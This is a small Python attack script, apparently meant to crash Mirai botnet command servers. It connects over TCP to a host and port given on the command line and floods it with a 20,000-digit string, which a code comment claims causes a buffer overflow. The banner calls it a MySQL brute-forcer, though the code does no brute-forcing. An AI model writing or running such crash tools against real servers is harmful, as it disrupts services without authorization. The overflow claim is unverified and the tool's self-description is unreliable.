import socket, sys, colorama, random, string
from colorama import Fore


BANNER = f'''
{Fore.BLUE}
███████╗██╗  ██╗██╗██████╗     ██████╗  ██████╗ ██████╗ 
██╔════╝██║ ██╔╝██║██╔══██╗    ██╔══██╗██╔═══██╗██╔══██╗
███████╗█████╔╝ ██║██║  ██║    ██████╔╝██║   ██║██████╔╝
╚════██║██╔═██╗ ██║██║  ██║    ██╔══██╗██║   ██║██╔═══╝ 
███████║██║  ██╗██║██████╔╝    ██████╔╝╚██████╔╝██║     
╚══════╝╚═╝  ╚═╝╚═╝╚═════╝     ╚═════╝  ╚═════╝ ╚═╝     
          [mysql bruter for mirai cncs]
              [Author: horrorhood]       
{Fore.RESET}                                       
'''

CNCIP = sys.argv[1]
CNCPORT = sys.argv[2]


def Log(txt:str):
    '''
    sexy logs
    '''
    print(f"[{Fore.BLUE}+{Fore.RESET}] {txt}")


def SendPayload(ip:str,port:int):
    '''
    connect via tcp and send a huge string -> will cause a buffer overflow
    '''

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)

    try: 
        sock.connect((ip,port))
        sock.send(''.join(random.choice(string.digits) for _ in range(20000)).encode()) # da huge string
        return True
        
    except:
        return False


def main():
    print(BANNER) # print sexy banner

    if SendPayload(CNCIP,int(CNCPORT)):
        Log(f"Sent payload to -> {CNCIP}:{CNCPORT}")

    else:
        Log("Failed crashing cnc")



if __name__ == "__main__":
    main()
